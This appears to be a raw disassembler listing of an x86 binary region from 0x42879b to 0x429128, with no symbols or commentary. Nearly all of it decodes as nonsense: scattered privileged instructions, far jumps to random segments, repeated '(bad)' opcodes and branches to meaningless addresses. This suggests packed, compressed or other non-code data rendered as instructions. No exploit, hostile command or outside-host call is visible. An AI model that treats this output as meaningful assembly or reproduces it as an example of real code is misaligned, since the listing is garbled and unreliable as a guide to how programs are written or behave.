  42879b:	and    ecx,ebp
  42879d:	xchg   ecx,eax
  42879e:	or     DWORD PTR [edx],edx
  4287a0:	sbb    eax,0x71ffc4ac
  4287a5:	jne    0xdb76d6e
  4287ab:	cld    
  4287ac:	adc    eax,0xdcfcb37d
  4287b1:	aas    
  4287b2:	idiv   BYTE PTR [edi]
  4287b4:	jmp    0x772b6a98
  4287b9:	add    BYTE PTR [ebp-0xa8d9109],al
  4287bf:	imul   esi,ecx,0x0
	...
  4287d9:	add    BYTE PTR [edi+0x78],cl
  4287dc:	out    0x5e,eax
  4287de:	call   0x1a995fdf
  4287e3:	test   bl,cl
  4287e5:	stos   BYTE PTR es:[edi],al
  4287e6:	imul   DWORD PTR [edi-0x60d8adaa]
  4287ec:	mov    edi,0x4f771
  4287f1:	jmp    0xcdf7:0xaacb63ea
  4287f8:	fcomp  QWORD PTR [eax+ecx*8+0x7a85577c]
  4287ff:	xchg   edi,eax
  428800:	push   edi
  428801:	push   ss
  428802:	mov    ecx,0xf769ef1f
  428807:	add    al,0x6a
  428809:	(bad)  [ecx-0x89725e1]
  42880f:	add    al,0xe9
  428811:	loopne 0x428809
  428813:	lods   al,BYTE PTR ds:[esi]
  428814:	pop    edi
  428815:	out    dx,al
  428816:	scas   al,BYTE PTR es:[edi]
  428817:	mov    ds:0xb2b3c230,eax
  42881c:	cld    
  42881d:	hlt    
  42881e:	mov    ds:0x46e93ff5,eax
  428823:	test   eax,0xad3b625a
  428828:	rol    DWORD PTR [eax],0x89
  42882b:	add    ecx,DWORD PTR [edi+0x56]
  42882e:	out    0xf0,al
  428830:	jl     0x4288b0
  428832:	mov    cl,0x0
  428834:	xchg   ecx,ebx
  428836:	sub    DWORD PTR [edx],esp
  428838:	xchg   DWORD PTR [esi+0x5],eax
  42883b:	cmp    ah,dl
  42883d:	ja     0x42883f
	...
  428857:	pop    edx
  428858:	es mov edi,0xe7691b89
  42885e:	push   es
  42885f:	fstp   TBYTE PTR ss:[edi+0x66]
  428863:	in     eax,0x0
  428865:	push   0xfc3f6188
  42886a:	dec    BYTE PTR [eax+0x17]
  42886d:	push   cs
  42886e:	inc    eax
  42886f:	or     eax,0x525766e6
  428874:	mov    al,cl
  428876:	inc    ebx
  428877:	sbb    eax,0x115fb4a
  42887c:	adc    DWORD PTR [eax+eax*1],edi
  42887f:	xchg   esi,eax
  428880:	push   0x64
  428882:	cmp    edx,ebx
  428884:	add    eax,DWORD PTR [edx-0xd]
  428887:	mov    esi,ebx
  428889:	jo     0x4288af
  42888b:	lds    eax,FWORD PTR [edi+0x4cc52470]
  428891:	sti    
  428892:	adc    eax,0x3fc679
  428897:	inc    esi
  428898:	fnstcw WORD PTR [edi-0x3c]
  42889b:	sar    DWORD PTR [edi-0x9],1
  42889e:	jmp    FWORD PTR [ecx+0x38]
  4288a1:	push   ebx
  4288a2:	call   FWORD PTR [eax-0x62bff1e6]
  4288a8:	jmp    0xf87f:0xf3a2ea61
  4288af:	xchg   edx,eax
  4288b0:	ins    DWORD PTR es:[edi],dx
  4288b1:	punpckhdq mm4,QWORD PTR [ebp-0x4d177396]
  4288b8:	repz pop es
  4288ba:	fadd   DWORD PTR [eax]
	...
  4288d4:	hlt    
  4288d5:	test   DWORD PTR cs:[ebx+0x5703dbb0],0x6701331d
  4288e0:	xor    al,0x94
  4288e2:	add    BYTE PTR [eax],al
  4288e4:	hlt    
  4288e5:	sbb    al,BYTE PTR [edi]
  4288e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4288e8:	xor    bl,bl
  4288ea:	add    esp,DWORD PTR [edi]
  4288ec:	mov    esp,0xe9fcb8f3
  4288f1:	pop    es
  4288f2:	repnz aas 
  4288f4:	hlt    
  4288f5:	into   
  4288f6:	mov    cl,0x88
  4288f8:	aaa    
  4288f9:	rol    DWORD PTR [ebp+0x7],cl
  4288fc:	hlt    
  4288fd:	call   0x80ba747e
  428902:	or     BYTE PTR [esi+0x18],bh
  428905:	cwde   
  428906:	add    BYTE PTR [eax],al
  428908:	hlt    
  428909:	jmp    0x1ac8:0x46c2d8d4
  428910:	ds rol ebp,cl
  428913:	(bad)  
  428914:	cli    
  428915:	xchg   edi,eax
  428916:	push   edx
  428917:	inc    DWORD PTR [ebx]
  428919:	sbb    al,0x18
  42891b:	cmp    cl,BYTE PTR [esi]
  42891d:	sbb    al,0x0
  42891f:	test   BYTE PTR [esi+edx*1+0x1bf4a284],dh
  428926:	add    BYTE PTR [edi],dh
  428928:	inc    ecx
  428929:	sub    BYTE PTR [ecx],al
  42892b:	test   BYTE PTR [eax+0x1b],bh
  42892e:	add    BYTE PTR [eax],al
  428930:	or     eax,0x7a0cf049
  428935:	mov    al,BYTE PTR [eax]
	...
  42894f:	add    BYTE PTR [eax],al
  428951:	hlt    
  428952:	mov    ds:0xf4220797,al
  428957:	mov    dh,0xf3
  428959:	mov    bl,0x6
  42895b:	test   DWORD PTR [edi-0x7d6805],edi
  428961:	mov    ds:0xa887511b,eax
  428966:	add    al,0x2a
  428968:	add    al,0x29
  42896a:	push   es
  42896b:	repz jmp 0x428953
  42896e:	(bad)  
  42896f:	out    0x1b,al
  428971:	mov    dl,0x1b
  428973:	int    0x11
  428975:	ins    BYTE PTR es:[edi],dx
  428976:	adc    al,0x6f
  428978:	cwde   
  428979:	pop    ss
  42897a:	in     eax,dx
  42897b:	imul   edx,DWORD PTR [edx],0x9b159068
  428981:	imul   edi,DWORD PTR [esi+eiz*8+0x3],0x67dc01f4
  428989:	aas    
  42898a:	shl    esi,0xca
  42898d:	test   eax,0x41001ca8
  428992:	(bad)  
  428993:	fidivr WORD PTR [ecx+esi*1+0x1c]
  428997:	sub    al,0x12
  428999:	xor    BYTE PTR ds:0xa6e2ad91,al
  42899f:	(bad)  
  4289a0:	cdq    
  4289a1:	add    eax,0x18f41b7a
  4289a6:	(bad)  
  4289a7:	bnd jl 0x4289e3
  4289aa:	add    eax,0x3d13fbd3
  4289af:	push   esp
  4289b0:	adc    DWORD PTR [eax],eax
  4289b2:	sbb    DWORD PTR [edx+0x10],esp
	...
  4289cc:	add    BYTE PTR [eax],al
  4289ce:	xchg   ah,dh
  4289d0:	jae    0x428982
  4289d2:	pop    ss
  4289d3:	push   ecx
  4289d4:	cmp    dl,BYTE PTR [edi-0x442fc01]
  4289da:	fcomi  st,st(6)
  4289dc:	cmp    dl,BYTE PTR [ecx]
  4289de:	fmul   DWORD PTR [esi-0x78101853]
  4289e4:	and    DWORD PTR [ecx],edx
  4289e6:	inc    esi
  4289e7:	xor    eax,0x1d17c85e
  4289ec:	add    DWORD PTR [edx],eax
  4289ee:	int    0x4
  4289f0:	add    edi,DWORD PTR [ebp-0x4c]
  4289f3:	in     eax,dx
  4289f4:	pop    eax
  4289f5:	mov    dl,0xa8
  4289f7:	add    al,0x1
  4289f9:	sahf   
  4289fa:	add    al,0x17
  4289fc:	sbb    al,0xdb
  4289fe:	mov    bh,0x4
  428a00:	sti    
  428a01:	pop    esp
  428a02:	mov    BYTE PTR [ecx],al
  428a04:	jbe    0x4289f3
  428a06:	in     al,0x76
  428a08:	or     dh,dl
  428a0a:	mov    bh,BYTE PTR [eax-0x34]
  428a0d:	sub    dh,al
  428a0f:	test   esp,eax
  428a11:	cmc    
  428a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428a13:	bound  edx,QWORD PTR [edi+0x72]
  428a16:	adc    bl,BYTE PTR [edi-0x41]
  428a19:	mov    dh,0x2d
  428a1b:	or     al,0x2f
  428a1d:	xchg   edx,eax
  428a1e:	cs pusha 
  428a20:	and    al,0x35
  428a22:	cmc    
  428a23:	mov    BYTE PTR [esi],bh
  428a25:	jmp    0x428a1e
  428a27:	add    al,0x8d
  428a29:	sub    eax,0x81504c4c
  428a2e:	rcl    BYTE PTR [edx-0x5],cl
  428a31:	xchg   BYTE PTR [eax],al
	...
  428a4b:	scas   al,BYTE PTR es:[edi]
  428a4c:	inc    edi
  428a4d:	and    al,0xc9
  428a4f:	iret   
  428a50:	add    dh,BYTE PTR [eax-0x36]
  428a53:	mov    ds:0xf8212447,al
  428a58:	dec    eax
  428a59:	pop    edx
  428a5a:	data16 in al,0x58
  428a5d:	sti    
  428a5e:	hlt    
  428a5f:	sbb    edx,DWORD PTR [esi]
  428a61:	inc    eax
  428a62:	jmp    0x41e1f6af
  428a67:	in     al,0x0
  428a69:	cld    
  428a6a:	fdivr  QWORD PTR [ebx-0x31]
  428a6d:	aas    
  428a6e:	jmp    0x21c1e511
  428a73:	add    al,0xed
  428a75:	mov    ch,0x60
  428a77:	mov    esp,DWORD PTR [edi]
  428a79:	sbb    BYTE PTR [eax-0x5d],dh
  428a7c:	daa    
  428a7d:	adc    al,0x51
  428a7f:	icebp  
  428a80:	adc    DWORD PTR [ebx+eax*4+0x620004f6],eax
  428a87:	add    eax,0x400b1ec
  428a8c:	adc    eax,0x8ad58bfc
  428a91:	fmul   DWORD PTR [edi]
  428a93:	adc    DWORD PTR [ebx+edi*8-0x1],ebx
  428a97:	lea    ecx,[eax+0x92124b7]
  428a9d:	add    BYTE PTR [eax],al
  428a9f:	pushf  
  428aa0:	add    bh,BYTE PTR [edi-0x6d]
  428aa3:	lea    eax,[edi]
  428aa5:	add    BYTE PTR [ebx+0x7bed19],cl
  428aab:	pop    ebp
  428aac:	pop    es
  428aad:	cmp    DWORD PTR [ecx+0x0],0x0
	...
  428ac8:	push   ecx
  428ac9:	pop    es
  428aca:	or     eax,0x8cf84
  428acf:	add    BYTE PTR [eax-0x37b7e034],bh
  428ad5:	xchg   esp,eax
  428ad6:	pop    ds
  428ad7:	and    al,0x65
  428ad9:	cmp    al,0x5b
  428adb:	jmp    FWORD PTR [edx+0x13]
  428ade:	scas   eax,DWORD PTR es:[edi]
  428adf:	and    al,0xcd
  428ae1:	or     BYTE PTR [eax],al
  428ae3:	add    BYTE PTR [ebp-0x59e8e034],ah
  428ae9:	mov    WORD PTR [edi],ds
  428aeb:	mov    BYTE PTR ds:0x36e80007,cl
  428af1:	mov    cl,0xfc
  428af3:	call   FWORD PTR [ebp+0x1d131f94]
  428af9:	add    al,BYTE PTR [eax+0x70c0b]
  428aff:	push   0xffffffaa
  428b01:	adc    ebp,DWORD PTR [edi+0x24]
  428b04:	icebp  
  428b05:	adc    ecx,DWORD PTR [esi]
  428b07:	sbb    al,0xce
  428b09:	(bad)  
  428b0a:	sti    
  428b0b:	(bad)  
  428b0c:	mov    eax,ds:0x8ae823ea
  428b11:	nop
  428b12:	sti    
  428b13:	call   FWORD PTR [edx]
  428b15:	popf   
  428b16:	pop    ds
  428b17:	xor    dl,ch
  428b19:	sti    
  428b1a:	call   DWORD PTR [edx]
  428b1c:	hlt    
  428b1d:	stos   DWORD PTR es:[edi],eax
  428b1e:	dec    DWORD PTR [eax-0x7d2437c8]
  428b24:	mov    bl,0xfb
  428b26:	sbb    edi,0xfffffff4
  428b29:	jmp    0x428b2a
  428b2b:	mov    al,BYTE PTR [eax]
	...
  428b45:	cmp    al,dl
  428b47:	mov    bh,0xe7
  428b49:	outs   dx,BYTE PTR ds:[esi]
  428b4a:	xchg   ecx,eax
  428b4b:	or     bh,ah
  428b4d:	jg     0x428b88
  428b4f:	hlt    
  428b50:	mov    BYTE PTR [eax],dh
  428b52:	or     al,dh
  428b54:	lds    esi,FWORD PTR [edi]
  428b56:	call   0xe442125a
  428b5b:	inc    ebp
  428b5c:	add    ch,dh
  428b5e:	out    dx,al
  428b5f:	inc    esp
  428b60:	xchg   BYTE PTR [edx-0x2fbabdad],dh
  428b66:	in     al,dx
  428b67:	sbb    al,0x9f
  428b69:	pop    edx
  428b6a:	mov    bl,0xa
  428b6c:	cld    
  428b6d:	leave  
  428b6e:	sti    
  428b6f:	or     dh,BYTE PTR [edx-0x8]
  428b72:	xchg   ebx,eax
  428b73:	arpl   WORD PTR [ebp-0xc],di
  428b76:	jmp    0x428bf4
  428b78:	inc    ebx
  428b79:	adc    ah,dh
  428b7b:	mov    BYTE PTR [edi-0x4cf51c57],bh
  428b81:	shr    BYTE PTR [ebx-0x1],1
  428b84:	push   esp
  428b86:	and    WORD PTR [ebx],0x6c
  428b8a:	in     al,dx
  428b8b:	(bad)  
  428b8c:	call   FWORD PTR [ebx+edx*4]
  428b8f:	mov    al,0xfc
  428b91:	or     edx,DWORD PTR [ebp-0x80]
  428b94:	inc    DWORD PTR [ebx]
  428b96:	in     al,dx
  428b97:	inc    ebp
  428b98:	add    ah,dh
  428b9a:	push   edx
  428b9b:	xchg   ebx,eax
  428b9c:	and    eax,DWORD PTR [edi+esi*2-0x3d]
  428ba0:	and    ecx,DWORD PTR [esp+edx*2-0x1]
  428ba4:	gs hlt 
  428ba6:	jmp    0x428c24
  428ba8:	inc    eax
	...
  428bc1:	add    ah,ch
  428bc3:	and    WORD PTR [ebx],0x74
  428bc7:	add    al,0xe9
  428bc9:	add    esi,esp
  428bcb:	mov    esp,DWORD PTR [esi-0x32779301]
  428bd1:	xchg   DWORD PTR [ebx-0x2a6615ff],edi
  428bd7:	mov    esp,DWORD PTR [esi-0x3a7f810d]
  428bdd:	retf   
  428bde:	dec    ebx
  428bdf:	in     eax,dx
  428be0:	out    dx,al
  428be1:	add    esp,esi
  428be3:	add    al,0x7f
  428be5:	loop   0x428c65
  428be7:	or     BYTE PTR ds:0xcaed23dc,0x1
  428bee:	hlt    
  428bef:	add    al,0x5e
  428bf1:	inc    ebp
  428bf2:	sub    edx,DWORD PTR [eax+0x552be825]
  428bf8:	ret    0xfb97
  428bfb:	add    DWORD PTR [esi],esi
  428bfd:	call   0xceee7919
  428c02:	pop    eax
  428c03:	add    DWORD PTR [eax-0x19],eax
  428c06:	jl     0x428be4
  428c08:	je     0x428b9a
  428c0a:	pop    ss
  428c0b:	sbb    eax,0x52e1c41
  428c10:	jmp    0x3a0bf918
  428c15:	mov    cl,0x30
  428c17:	js     0x428be6
  428c19:	jecxz  0x428c2e
  428c1b:	push   cs
  428c1c:	mov    ebx,0xca6e200c
  428c21:	js     0x428c66
  428c23:	(bad)  
  428c24:	in     eax,dx
  428c25:	out    0x0,eax
	...
  428c3f:	retf   
  428c40:	pop    esp
  428c41:	push   ecx
  428c42:	push   edx
  428c43:	hlt    
  428c44:	add    al,0xe9
  428c46:	js     0x428c80
  428c48:	push   esp
  428c49:	mov    dh,0xc
  428c4b:	xchg   DWORD PTR [eax],ebp
  428c4d:	or     DWORD PTR [eax+eiz*8],ebx
  428c50:	inc    edx
  428c51:	inc    edx
  428c52:	or     eax,0xf8054972
  428c57:	jmp    0xd04f8ca5
  428c5c:	add    al,0x74
  428c5e:	xchg   esi,eax
  428c5f:	dec    esp
  428c60:	jl     0x428c86
  428c62:	add    DWORD PTR [ebx+0x1],esi
  428c65:	jbe    0x428c58
  428c67:	cmp    al,0x7b
  428c69:	or     al,0x62
  428c6b:	mov    edx,DWORD PTR [eax]
  428c6d:	out    0xe5,eax
  428c6f:	sub    al,0x5c
  428c71:	and    al,0xdd
  428c73:	sub    al,BYTE PTR [esp-0x1f]
  428c77:	add    DWORD PTR [di-0x33],esi
  428c7b:	or     DWORD PTR [ebp+0x246beebf],0x74
  428c82:	ds call 0xf1217d77
  428c88:	add    BYTE PTR [ebp+0xd],dh
  428c8b:	push   esp
  428c8c:	xchg   DWORD PTR [ebp+eax*1+0x60],eax
  428c90:	call   0x532d0e1
  428c95:	jg     0x428cd4
  428c97:	dec    esp
  428c98:	adc    al,0x0
  428c9a:	cmp    al,0x59
  428c9c:	cmp    eax,0x4e6bdd7d
  428ca1:	mov    DWORD PTR ds:0x0,esp
	...
  428cbb:	add    BYTE PTR [eax+ebx*1-0x77],bl
  428cbf:	cmp    eax,0xe2e7144c
  428cc4:	sub    al,0x7b
  428cc6:	or     al,0x15
  428cc8:	cli    
  428cc9:	pop    ecx
  428cca:	call   0xfc4307a1
  428ccf:	jb     0x428d44
  428cd1:	and    al,0x18
  428cd3:	ins    BYTE PTR es:[edi],dx
  428cd4:	call   0x3b9eba4c
  428cd9:	and    al,0x48
  428cdb:	push   ecx
  428cdc:	xor    ebx,DWORD PTR [ebx+edi*8+0x5e]
  428ce0:	jl     0x428d25
  428ce2:	and    al,0xf5
  428ce4:	je     0x428d50
  428ce6:	pusha  
  428ce7:	jmp    0xaad75a
  428cec:	enterw 0x141f,0x64
  428cf1:	retf   0x8b57
  428cf4:	mov    bl,dh
  428cf6:	lds    eax,FWORD PTR [esi-0x6f]
  428cf9:	add    eax,DWORD PTR [ebx+0x457ab57e]
  428cff:	fs in  al,0xc2
  428d02:	idiv   bh
  428d04:	loop   0x428d84
  428d06:	aas    
  428d07:	and    al,0x55
  428d09:	sbb    edx,DWORD PTR [esp+ebx*2]
  428d0c:	repnz adc BYTE PTR [eax-0x771046bc],cl
  428d13:	dec    ebp
  428d14:	mov    ebp,0x5b89bb04
  428d19:	fwait
  428d1a:	lds    eax,FWORD PTR [esi+0x21]
  428d1d:	or     ebx,esp
  428d1f:	aaa    
	...
  428d38:	add    BYTE PTR [eax+0x1655fc0b],ah
  428d3e:	sbb    eax,0x3f973d7b
  428d43:	inc    eax
  428d44:	add    BYTE PTR [ebp-0x4a],bl
  428d47:	mov    BYTE PTR [ebp+0x65],bl
  428d4a:	mov    ch,0x54
  428d4c:	je     0x428d6a
  428d4e:	fdivr  st,st(4)
  428d50:	cmp    eax,DWORD PTR [edx+0x10396894]
  428d56:	std    
  428d57:	jge    0x428dbf
  428d59:	gs and ah,ch
  428d5c:	add    BYTE PTR [ebp+0x7f],cl
  428d5f:	mov    ebx,0x83a0e074
  428d64:	int3   
  428d65:	fimul  WORD PTR [eax]
  428d67:	std    
  428d68:	adc    eax,0x3bf915
  428d6d:	mov    WORD PTR fs:[edi],es
  428d70:	jle    0x428d51
  428d72:	adc    bh,BYTE PTR [edi]
  428d74:	sti    
  428d75:	sbb    DWORD PTR [eax],ecx
  428d77:	je     0x428dae
  428d79:	xchg   ah,dl
  428d7b:	clc    
  428d7c:	call   0xfc610875
  428d81:	repz imul ecx,DWORD PTR [esp+edi*8],0x60
  428d86:	adc    al,0x9d
  428d88:	mov    edi,0xffffec6c
  428d8d:	div    eax
  428d8f:	pop    ebx
  428d90:	retf   
  428d91:	aaa    
  428d92:	in     al,dx
  428d93:	xor    BYTE PTR [edi+0x40],0xec
  428d97:	nop
  428d98:	cmp    esi,DWORD PTR [esp+eiz*4-0x78]
  428d9c:	inc    DWORD PTR [eax]
	...
  428db6:	inc    eax
  428db7:	fidivr WORD PTR [edx-0x39]
  428dba:	pushf  
  428dbb:	pop    esi
  428dbc:	pop    ds
  428dbd:	cld    
  428dbe:	stos   DWORD PTR es:[edi],eax
  428dbf:	jno    0x428e05
  428dc1:	jae    0x428dbc
  428dc3:	cmc    
  428dc4:	(bad)  
  428dc5:	(bad)  
  428dc6:	and    dh,cl
  428dc8:	mov    esi,0x83e01138
  428dcd:	mov    ebp,0x4033741c
  428dd2:	hlt    
  428dd3:	fdivrp st(0),st
  428dd5:	sbb    esp,esi
  428dd7:	sub    eax,DWORD PTR [edi*8+0x7206fbe9]
  428dde:	clc    
  428ddf:	sbb    al,BYTE PTR [edi]
  428de1:	adc    ah,al
  428de3:	scas   eax,DWORD PTR es:[edi]
  428de4:	ret    0x76ff
  428de7:	mov    al,0xf3
  428de9:	pop    esp
  428dea:	mov    dl,0x12
  428dec:	test   eax,0x3373dcc0
  428df1:	inc    eax
  428df2:	hlt    
  428df3:	sahf   
  428df4:	lock sbb esp,esi
  428df7:	sub    eax,DWORD PTR [ecx+esi*1]
  428dfa:	xor    al,0x2c
  428dfc:	sahf   
  428dfd:	xchg   BYTE PTR [eax+0x3b890182],dh
  428e03:	xchg   ebx,eax
  428e04:	sbb    eax,DWORD PTR [edx-0x763effba]
  428e0a:	(bad)  
  428e0b:	addr16 cmp al,0x73
  428e0e:	retf   
  428e0f:	add    al,0x16
  428e11:	inc    esp
  428e12:	cmp    ebx,0xc
  428e15:	xchg   ecx,eax
  428e16:	imul   BYTE PTR [edx-0x19]
  428e19:	stos   DWORD PTR es:[edi],eax
	...
  428e32:	add    ah,bl
  428e34:	pop    es
  428e35:	imul   ecx,DWORD PTR [esp+ebx*1],0x49c5e878
  428e3c:	xor    dh,BYTE PTR [ebx]
  428e3e:	push   ds
  428e3f:	jmp    0x428dc5
  428e41:	xor    ah,cl
  428e43:	push   eax
  428e44:	adc    edi,DWORD PTR [esi+0x630dfd11]
  428e4a:	cmp    al,0x6e
  428e4c:	js     0x428e39
  428e4e:	xor    esi,DWORD PTR ds:0xaa83df8b
  428e54:	xor    al,0x8c
  428e56:	sbb    al,0x77
  428e58:	retf   
  428e59:	jge    0x428e61
  428e5b:	jne    0x428e29
  428e5d:	call   0xe7bb83bd
  428e62:	adc    dh,BYTE PTR [ecx-0x4b564d75]
  428e68:	or     DWORD PTR [edx],0x410d0e04
  428e6e:	inc    ebp
  428e6f:	es mov al,ch
  428e72:	sbb    DWORD PTR [edi+0x64],0xffffffe5
  428e76:	add    esi,esp
  428e78:	push   ecx
  428e79:	outs   dx,BYTE PTR ds:[esi]
  428e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e7b:	sti    
  428e7c:	push   esi
  428e7d:	adc    bl,BYTE PTR [edi+edi*4-0x5afbd685]
  428e84:	(bad)  
  428e85:	fs pusha 
  428e87:	dec    esp
  428e88:	std    
  428e89:	mov    ds:0x91f36cb4,al
  428e8e:	mov    edi,DWORD PTR [esi-0x3]
  428e91:	xchg   edx,eax
  428e92:	jg     0x428f07
  428e94:	ja     0x428e77
  428e96:	popf   
	...
  428eaf:	add    ah,dh
  428eb1:	pop    esp
  428eb2:	nop
  428eb3:	scas   eax,DWORD PTR es:[edi]
  428eb4:	and    bh,ch
  428eb6:	jmp    0xf30531
  428ebb:	je     0x428eba
  428ebd:	add    BYTE PTR [ecx+0x5c],dl
  428ec0:	mov    esp,DWORD PTR [ecx+0x4ded66f7]
  428ec6:	sti    
  428ec7:	hlt    
  428ec8:	pop    es
  428ec9:	adc    eax,DWORD PTR [eax-0x17]
  428ecc:	outs   dx,BYTE PTR ds:[esi]
  428ecd:	inc    edi
  428ece:	or     BYTE PTR [edx-0x8],ch
  428ed1:	clc    
  428ed2:	jne    0x428ec1
  428ed4:	or     DWORD PTR [eax],0xf9c123e7
  428eda:	lea    ebp,[eax+eiz*1-0x1]
  428ede:	sti    
  428edf:	cs call 0xf82c663a
  428ee5:	add    al,0xee
  428ee8:	cmp    dl,bh
  428eea:	add    cl,ch
  428eec:	test   DWORD PTR [ebp-0x70089df6],0xf8fb5595
  428ef6:	sti    
  428ef7:	fwait
  428ef8:	pusha  
  428ef9:	stc    
  428efa:	push   eax
  428efb:	in     eax,dx
  428efc:	adc    bh,BYTE PTR [esp+esi*2+0x1f470e1]
  428f03:	shr    BYTE PTR [edi],1
  428f05:	cld    
  428f06:	sti    
  428f07:	jmp    0xd4ef15f1
  428f0c:	cld    
  428f0d:	clc    
  428f0e:	adc    dh,bl
  428f10:	jmp    0x428e99
  428f12:	add    cl,ch
	...
  428f2c:	add    bh,dh
  428f2e:	repnz inc edx
  428f30:	icebp  
  428f31:	icebp  
  428f32:	jo     0x428f53
  428f34:	fs rcl bl,cl
  428f37:	std    
  428f38:	scas   al,BYTE PTR es:[edi]
  428f39:	cld    
  428f3a:	dec    ebx
  428f3b:	call   0x4786d4
  428f40:	gs mov bh,0x77
  428f43:	punpckldq mm5,DWORD PTR ds:0x9a5c018d
  428f4a:	scas   eax,DWORD PTR es:[edi]
  428f4b:	std    
  428f4c:	add    BYTE PTR [edx+0xd],bh
  428f4f:	push   ecx
  428f50:	push   ebx
  428f51:	call   0xc18b:0x5d8503b7
  428f58:	not    bl
  428f5a:	clc    
  428f5b:	cli    
  428f5c:	jae    0x428f79
  428f5e:	jae    0x428fde
  428f60:	fcomp  DWORD PTR [eax-0x51af03f4]
  428f66:	jb     0x428fe6
  428f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f69:	inc    esi
  428f6a:	or     eax,0x334550fc
  428f6f:	mov    bh,0xff
  428f71:	sbb    bh,BYTE PTR [ebx-0x45]
  428f74:	jne    0x428f56
  428f76:	cdq    
  428f77:	add    BYTE PTR [edi+0x36],bl
  428f7a:	out    dx,al
  428f7b:	xchg   BYTE PTR [ebp-0x3f6cf],al
  428f81:	jge    0x428ffb
  428f83:	int    0xe8
  428f85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f86:	or     al,0xfc
  428f88:	call   DWORD PTR [esi]
  428f8a:	adc    BYTE PTR [esi-0x1],bh
  428f8d:	and    DWORD PTR [ebx+0xff80],esi
	...
  428fa7:	add    BYTE PTR [eax],al
  428fa9:	add    BYTE PTR [ebx+ecx*4+0x8a8366],cl
  428fb0:	je     0x42901a
  428fb2:	push   ss
  428fb3:	dec    BYTE PTR [eax-0x71823dff]
  428fb9:	lods   al,BYTE PTR ds:[esi]
  428fba:	cwde   
  428fbb:	add    edi,esp
  428fbd:	push   edx
  428fbe:	cs add al,0x4b
  428fc1:	or     al,0xde
  428fc3:	or     BYTE PTR [eax],al
  428fc5:	je     0x428fa4
  428fc7:	sbb    DWORD PTR [edi+edi*8-0x66],esp
  428fcb:	add    esi,ebp
  428fcd:	inc    esi
  428fce:	push   ebp
  428fcf:	sti    
  428fd0:	outs   dx,DWORD PTR ds:[esi]
  428fd1:	and    ebp,DWORD PTR [eax-0x65022c7b]
  428fd7:	add    ecx,DWORD PTR [ebx-0x18]
  428fda:	in     al,0x0
  428fdc:	add    BYTE PTR [eax],al
  428fde:	hlt    
  428fdf:	imul   eax,DWORD PTR [ebx+esi*2+0x7],0xf588f267
  428fe7:	jo     0x42905a
  428fe9:	stos   DWORD PTR es:[edi],eax
  428fea:	sbb    DWORD PTR [edx+0x3],edi
  428fed:	push   ecx
  428fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fef:	jb     0x428fa5
  428ff1:	pop    es
  428ff2:	jno    0x428fa1
  428ff4:	xchg   ecx,eax
  428ff5:	sbb    DWORD PTR [ecx+0x68],esi
  428ff8:	pop    eax
  428ff9:	cli    
  428ffa:	sti    
  428ffb:	pop    ecx
  428ffc:	mov    ah,0xfc
  428ffe:	imul   esp,esp,0xfdf01202
  429004:	mov    edi,0xf32c78ff
  429009:	xor    ah,0x3a
  42900c:	add    edi,esp
	...
  429026:	add    bh,bl
  429028:	out    0xce,eax
  42902a:	(bad)  
  42902b:	ja     0x429061
  42902d:	dec    BYTE PTR [ecx+ebp*2]
  429030:	sub    eax,0x1af57679
  429035:	icebp  
  429036:	or     eax,DWORD PTR [edi]
  429038:	lods   al,BYTE PTR ds:[esi]
  429039:	dec    DWORD PTR [eax+0x720361a4]
  42903f:	in     al,dx
  429040:	outs   dx,BYTE PTR ds:[esi]
  429041:	add    dl,BYTE PTR [ecx]
  429043:	and    bh,ch
  429045:	cdq    
  429046:	add    esi,DWORD PTR [ebx]
  429048:	pause  
  42904a:	pop    es
  42904b:	mov    edx,ecx
  42904d:	repz adc DWORD PTR [esp+ebp*8],esi
  429051:	lods   eax,DWORD PTR ds:[esi]
  429052:	cld    
  429053:	loope  0x429064
  429055:	out    dx,al
  429056:	aas    
  429057:	hlt    
  429058:	data16 cmp bl,BYTE PTR [edx+ecx*8+0x36]
  42905d:	cmp    eax,0xaaebf8c1
  429062:	xor    BYTE PTR [ebx+0x5],bl
  429065:	mov    BYTE PTR [ebx],ah
  429067:	cld    
  429068:	cmp    BYTE PTR [eax],al
  42906a:	xor    dh,BYTE PTR [edi+eax*8]
  42906d:	mov    al,0x88
  42906f:	mov    edx,0x30dafd04
  429074:	jno    0x4290a3
  429076:	mov    esp,0x912120a7
  42907b:	sbb    BYTE PTR [ebx+ecx*1],bh
  42907e:	hlt    
  42907f:	test   eax,0xefbd6eee
  429084:	stc    
  429085:	mov    ch,0x4b
  429087:	adc    BYTE PTR [ecx-0x33],dh
  42908a:	test   DWORD PTR [eax],0x0
	...
  4290a4:	or     BYTE PTR [eax],dl
  4290a6:	dec    ebp
  4290a7:	bnd ret 
  4290a9:	add    al,0x6c
  4290ab:	inc    ebx
  4290ac:	xchg   BYTE PTR [edi],ah
  4290ae:	mov    ds:0xd71571ca,al
  4290b3:	sbb    eax,0xbd5ecadc
  4290b8:	out    dx,eax
  4290b9:	mov    eax,ecx
  4290bb:	test   esp,0x47069909
  4290c1:	and    ebp,esp
  4290c3:	push   es
  4290c4:	out    0x98,al
  4290c6:	(bad)  
  4290c7:	ret    
  4290c8:	ret    
  4290c9:	sub    BYTE PTR [ecx],0x90
  4290cc:	jmp    0x9c3a345e
  4290d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4290d2:	inc    ecx
  4290d3:	add    eax,0x90223da8
  4290d8:	xchg   esi,eax
  4290d9:	in     eax,dx
  4290da:	push   eax
  4290db:	push   ebx
  4290dc:	call   0x3a0a:0x93ff275a
  4290e3:	inc    ebx
  4290e4:	jle    0x4290e6
  4290e6:	and    al,0x3
  4290e8:	adc    al,0x45
  4290ea:	jmp    0xb07836bf
  4290ef:	sahf   
  4290f0:	sub    al,0x55
  4290f2:	out    0x90,eax
  4290f4:	add    dl,BYTE PTR [ebx+0x5e]
  4290f7:	mov    ah,0xf7
  4290f9:	or     DWORD PTR [edx+0x13],edi
  4290fc:	ins    DWORD PTR es:[edi],dx
  4290fd:	adc    bh,dh
  4290ff:	rol    DWORD PTR [ebx],1
  429101:	aaa    
  429102:	add    BYTE PTR [eax-0x10eb7ec9],bl
	...
  429120:	add    BYTE PTR [ecx+0x3c],ah
  429123:	dec    eax
  429124:	jmp    0x42918b
  429126:	loop   0x429182
  429128:	out    dx,al
